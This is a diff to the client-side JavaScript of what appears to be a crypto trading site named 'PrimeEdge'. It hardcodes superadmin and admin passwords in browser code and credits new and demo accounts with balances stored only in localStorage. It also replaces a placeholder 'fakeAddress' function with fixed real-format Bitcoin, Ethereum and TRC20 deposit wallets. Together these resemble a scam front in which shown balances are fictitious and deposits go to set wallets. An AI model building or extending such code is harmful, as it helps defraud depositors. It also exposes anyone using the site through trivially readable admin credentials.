@@ -52,7 +52,12 @@ const Store = {
   login(email, password) {
     const users = this.getUsers();
     
-    // Check demo accounts first
+    // Check admin accounts first
+    if (email === "superadmin@primeedge.com" && password === "superadmin123") {
+      this.setSession("superadmin", email);
+      return { success: true, userType: "superadmin" };
+    }
+
     if (email === "admin@primeedge.com" && password === "admin123") {
       this.setSession("admin", email);
       return { success: true, userType: "admin" };
@@ -103,6 +108,7 @@ const Store = {
     sessionStorage.removeItem(KEYS.userType);
     sessionStorage.removeItem(KEYS.userEmail);
     localStorage.removeItem(KEYS.session);
+    navigate('login.html');
   },
   
   isLoggedIn() {
@@ -214,12 +220,24 @@ const Store = {
       users = Store.getUsers();
     }
   };
+  const demoId = sid();
   ensure("demo@primeedge.com", {
-    id: sid(), name: "Demo User", email: "demo@primeedge.com",
+    id: demoId, name: "Demo User", email: "demo@primeedge.com",
     password: "demo123", role: "user", createdAt: now()
   });
+  // Set demo account initial balance
+  if (!localStorage.getItem(KEYS.balances("demo"))) {
+    Store.setBalances("demo", {
+      total: 20000,
+      deposit: 10000,
+      trading: 10000,
+      locked: 0
+    });
+  }
+  
+  const adminId = sid();
   ensure("admin@primeedge.com", {
-    id: sid(), name: "Admin", email: "admin@primeedge.com",
+    id: adminId, name: "Admin", email: "admin@primeedge.com",
     password: "admin123", role: "admin", createdAt: now()
   });
 })();
@@ -562,7 +580,7 @@ function onSignupPage() {
       createdAt: now()
     };
     users.push(user); Store.setUsers(users);
-    Store.setBalances(user.id, { total: 0, deposit: 0, trading: 0, locked: 0 });
+    Store.setBalances(user.id, { total: 1000, deposit: 1000, trading: 0, locked: 0 });
     Store.setCounters(user.id, { tradeCount: 0 });
     Store.setSession(user);
     msg.textContent = "Account created! Redirecting…";
@@ -1780,8 +1798,14 @@ function onDashboardPage() {
 
 /* ---------- Deposit ---------- */
 function fakeAddress(asset) {
-  const base = { "BTC":"bc1q", "ETH":"0x", "USDT-TRC20":"T", "USDC-TRC20":"T" }[asset] || "0x";
-  return base + Math.random().toString(36).slice(2,12) + Math.random().toString(36).slice(2,10);
+  const addresses = {
+    "BTC": "bc1qd7lz35hfw2a4xwm0m9dpptwlc8d0h5r0gckl2s",
+    "ETH": "0x830D40268601556eA49e824C25C1CcE0bd0976F9",
+    "USDT-TRC20": "TXwZZxyTiskyfzYmcuYJ2HFHnoLo1DJJkv",
+    "USDC-TRC20": "TXwZZxyTiskyfzYmcuYJ2HFHnoLo1DJJkv",
+    "BNB": "0x830D40268601556eA49e824C25C1CcE0bd0976F9"
+  };
+  return addresses[asset] || addresses["ETH"];
 }
 function renderMyDeposits() {
   const me = currentUser(); if (!me) return;
@@ -1808,7 +1832,59 @@ function renderMyDeposits() {
 }
 function onDepositPage() {
   if (!requireAuth()) return;
-  setupAppBar(); updateBalancesUI(); renderMyDeposits();
+  setupAppBar();
+  
+  // Add copy functionality for wallet addresses
+  const copyButtons = document.querySelectorAll('.copy-address, #copyAddrBtn');
+  copyButtons.forEach(button => {
+    button.addEventListener('click', () => {
+      const address = button.previousElementSibling.textContent;
+      navigator.clipboard.writeText(address).then(() => {
+        // Change button icon temporarily to show success
+        const icon = button.querySelector('i');
+        icon.className = 'fas fa-check';
+        setTimeout(() => {
+          icon.className = 'fas fa-copy';
+        }, 2000);
+        
+        // Show toast
+        toast('Address copied to clipboard!');
+      });
+    });
+  });
+
+  // Modal functionality
+  const modal = document.getElementById('addressesModal');
+  const showAddressesBtn = document.getElementById('showAddressesBtn');
+  const closeModalBtn = document.querySelector('.close-modal');
+
+  if (showAddressesBtn) {
+    showAddressesBtn.addEventListener('click', () => {
+      modal.classList.remove('hidden');
+    });
+  }
+
+  if (closeModalBtn) {
+    closeModalBtn.addEventListener('click', () => {
+      modal.classList.add('hidden');
+    });
+  }
+
+  // Close modal when clicking outside
+  modal?.addEventListener('click', (e) => {
+    if (e.target === modal) {
+      modal.classList.add('hidden');
+    }
+  });
+
+  // Update instruction details when form is submitted
+  const depositForm = document.getElementById('depositForm');
+  depositForm?.addEventListener('submit', (e) => {
+    const asset = document.getElementById('depositAsset').value;
+    const amount = document.getElementById('depositAmount').value;
+    document.getElementById('selectedAsset').textContent = asset;
+    document.getElementById('selectedAmount').textContent = `$${amount} USD`;
+  }); updateBalancesUI(); renderMyDeposits();
   const me = currentUser();
   const form = $("#depositForm");
   const asset = $("#depositAsset"); const amt = $("#depositAmount"); const msg = $("#depositMsg");
@@ -2087,6 +2163,14 @@ function onWelcomePage() {
 document.addEventListener("DOMContentLoaded", () => {
   const page = document.body.dataset.page || "";
 
+  // Setup logout functionality
+  document.querySelectorAll('#logoutBtn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      Store.clearSession();
+      navigate('login.html');
+    });
+  });
+
   // common: wire nav buttons that have data-link to anchor navigation
   document.addEventListener("click", (e) => {
     const link = e.target.closest("[data-link]");
@@ -2098,6 +2182,14 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 
   if ($("#appBar")) setupAppBar();
+
+  // Wire up logout buttons
+  const logoutBtn = $("#logoutBtn");
+  if (logoutBtn) {
+    logoutBtn.addEventListener("click", () => {
+      Store.clearSession();
+    });
+  }
 
   switch (page) {
     case "welcome": onWelcomePage(); break;
